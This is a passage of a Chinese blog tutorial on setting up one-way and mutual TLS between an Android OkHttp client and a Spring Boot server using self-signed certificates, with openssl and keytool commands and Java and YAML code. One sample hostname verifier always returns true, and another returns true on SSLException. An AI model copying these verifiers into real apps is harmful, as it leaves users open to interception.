src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_lTdR1VpcQy.png\"></p>\n<p>这就说明了，这里我们需要用https的形式来访问，切换到https之后，访问是正常的，因为这里是自签名证书，所以Chrome不认，报了危险。</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_zOy3CHG1cE.png\"></p>\n<p>然后，我们来看证书的信息</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_dvxtinkLry.png\"></p>\n<p>这里和我们刚才的输入是一致的。</p>\n<h3 id=\"Android使用OKhttp访问\"><a href=\"#Android使用OKhttp访问\" class=\"headerlink\" title=\"Android使用OKhttp访问\"></a>Android使用OKhttp访问</h3><p>新建一个Android项目，然后引入OKhttp的包，这里新建Android项目也不过多介绍了，注意别忘了添加联网权限。这里只粘贴关键代码，其他代码自行补充完整。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 这里需要粘贴自己证书的内容</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">ROOT_CA_CERT</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">        OkHttpClient.<span class=\"type\">Builder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>().newBuilder()</span><br><span class=\"line\">                .retryOnConnectionFailure(<span class=\"literal\">false</span>)</span><br><span class=\"line\">                .connectTimeout(<span class=\"number\">60</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">                .readTimeout(<span class=\"number\">60</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">                .writeTimeout(<span class=\"number\">60</span>, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// region TrustManager</span></span><br><span class=\"line\">        <span class=\"type\">TrustManagerFactory</span> <span class=\"variable\">trustManagerFactory</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class=\"line\">            trustManagerFactory.init(getKeyStore());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchAlgorithmException | KeyStoreException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (trustManagers.length != <span class=\"number\">1</span> || !(trustManagers[<span class=\"number\">0</span>] <span class=\"keyword\">instanceof</span> X509TrustManager)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">&quot;Unexpected default trust managers:&quot;</span></span><br><span class=\"line\">                    + Arrays.toString(trustManagers));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">X509TrustManager</span> <span class=\"variable\">trustManager</span> <span class=\"operator\">=</span> (X509TrustManager) trustManagers[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"comment\">// endregion</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// region SSLContext</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">SSLContext</span> <span class=\"variable\">sslContext</span> <span class=\"operator\">=</span> SSLContext.getInstance(<span class=\"string\">&quot;TLS&quot;</span>);</span><br><span class=\"line\">            sslContext.init(<span class=\"literal\">null</span>, trustManagers, <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (KeyManagementException | NoSuchAlgorithmException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// endregion</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 对hostname进行校验, 这里直接返回true, 这里可以取到之前设置的IP</span></span><br><span class=\"line\">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ... 发送请求并验证</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> KeyStore <span class=\"title function_\">getKeyStore</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 添加https证书</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">CertificateFactory</span> <span class=\"variable\">certificateFactory</span> <span class=\"operator\">=</span> CertificateFactory.getInstance(<span class=\"string\">&quot;X.509&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">KeyStore</span> <span class=\"variable\">keyStore</span> <span class=\"operator\">=</span> KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">            keyStore.load(<span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"type\">InputStream</span> <span class=\"variable\">is</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Buffer</span>().writeUtf8(ROOT_CA_CERT).inputStream();</span><br><span class=\"line\">            <span class=\"comment\">// 签名文件设置证书</span></span><br><span class=\"line\">            keyStore.setCertificateEntry(<span class=\"string\">&quot;0&quot;</span>, certificateFactory.generateCertificate(is));</span><br><span class=\"line\">            is.close();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> keyStore;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看到这个内容，说明是成功了的，否则就是失败了。</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_RYhvy0zAZN.png\"></p>\n<p>到目前为止，我们已经完成了单向认证，也就是客户端校验服务端的证书，也就是标准的https的过程，接下来我们一起在此基础之上看一下双向认证是如何来实现的。</p>\n<h2 id=\"双向认证\"><a href=\"#双向认证\" class=\"headerlink\" title=\"双向认证\"></a>双向认证</h2><ul>\n<li>根据上述生成服务端证书的方法生成客户端的证书</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out clientCA.key 2048</span><br><span class=\"line\">openssl req -new  -key clientCA.key -out clientCA.csr -sha256</span><br><span class=\"line\">openssl x509 -req -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -<span class=\"keyword\">in</span> clientCA.csr -out clientCA.crt -sha256</span><br><span class=\"line\">openssl pkcs12 -<span class=\"built_in\">export</span> -clcerts -<span class=\"keyword\">in</span> clientCA.crt -inkey clientCA.key -out clientCA.p12</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_QxV35eFf_D.png\"></p>\n<p>这里，同样需要输入密码，也是要记住的。</p>\n<ul>\n<li>将上面的证书转换为Android可用的格式</li>\n</ul>\n<p><a href=\"https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16\" title=\"https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16\">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a>下载这个工具转换即可。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">keytool -importkeystore -srckeystore clientCA.p12 -srcstoretype pkcs12 -destkeystore clientCA.bks -deststoretype bks -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath bcprov-jdk16-1.46.jar</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_IXehv1H0uW.png\"></p>\n<p>这个密码和上面一致就可以了。</p>\n<ul>\n<li>修改Android代码，添加新的证书</li>\n</ul>\n<p>这里，只贴出了差异的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// region 双向认证服务端证书</span></span><br><span class=\"line\">        <span class=\"type\">KeyStore</span> <span class=\"variable\">clientKeyStore</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">SSLContext</span> <span class=\"variable\">sslContext</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            clientKeyStore = KeyStore.getInstance(<span class=\"string\">&quot;BKS&quot;</span>);</span><br><span class=\"line\">            clientKeyStore.load(getApplicationContext().getAssets().open(<span class=\"string\">&quot;clientCA.bks&quot;</span>), <span class=\"string\">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class=\"line\">            <span class=\"type\">KeyManagerFactory</span> <span class=\"variable\">keyManagerFactory</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                    KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class=\"line\">            keyManagerFactory.init(clientKeyStore, <span class=\"string\">&quot;刚才需要记住的密码&quot;</span>.toCharArray());</span><br><span class=\"line\">            sslContext = SSLContext.getInstance(<span class=\"string\">&quot;TLS&quot;</span>);</span><br><span class=\"line\">            sslContext.init(keyManagerFactory.getKeyManagers(), trustManagers, <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">            builder.sslSocketFactory(sslContext.getSocketFactory(), trustManager);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (KeyStoreException | IOException | NoSuchAlgorithmException | UnrecoverableKeyException | CertificateException | KeyManagementException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// endregion</span></span><br><span class=\"line\"></span><br><span class=\"line\">        builder.hostnameVerifier((String hostname, SSLSession session) -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">final</span> Certificate[] certs = session.getPeerCertificates();</span><br><span class=\"line\">                <span class=\"keyword\">final</span> <span class=\"type\">X509Certificate</span> <span class=\"variable\">x509</span> <span class=\"operator\">=</span> (X509Certificate) certs[<span class=\"number\">0</span>];</span><br><span class=\"line\">                <span class=\"keyword\">return</span> verifyHostName(hostname, x509);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">final</span> SSLException ex) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>转换服务端根证书到keystore格式</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">keytool -import -file rootCA.crt -<span class=\"built_in\">alias</span> rootCA -keystore rootCA.keystore -storepass 密码</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_esGXxpchqu.png\"></p>\n<ul>\n<li>配置服务端证书</li>\n</ul>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">    <span class=\"comment\"># ...</span></span><br><span class=\"line\">    <span class=\"attr\">client-auth:</span> <span class=\"string\">need</span></span><br><span class=\"line\">    <span class=\"attr\">trust-store:</span> <span class=\"string\">classpath:rootCA.keystore</span></span><br><span class=\"line\">    <span class=\"attr\">trust-store-password:</span> <span class=\"string\">刚才的密码</span></span><br><span class=\"line\">    <span class=\"attr\">trust-store-type:</span> <span class=\"string\">JKS</span></span><br><span class=\"line\">    <span class=\"attr\">trust-store-provider:</span> <span class=\"string\">SUN</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后，我们直接用Chrome打开看一下。</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_LelbMjw5CP.png\"></p>\n<p>这里，提示我们客户端证书校验失败，这就是后端配置成功了，然后我们运行下app来看一下。</p>\n<p><img src=\"https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/littleQ/blog1/image_ZcOGc8nqaO.png\"></p>\n<p>发现，客户端是可以获取成功的，到这里我们双向认证就完成了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>我们可能经常遇到使用了双向认证的APP，但是咱们能不能自己实现一下这个双向认证呢，本文主要是给大家提供了一个自签名证书实现双向认证的方案，仅供参考。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p><a href=\"https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/\" title=\"https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/\">https://ma.ttias.be/how-to-read-ssl-certificate-info-from-the-cli/</a></p>\n</li>\n<li><p><a href=\"https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16\" title=\"https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16\">https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk16</a></p>\n</li>\n</ul>\n","categories":["Android开发"],"tags":["抓包","Android开发"]}]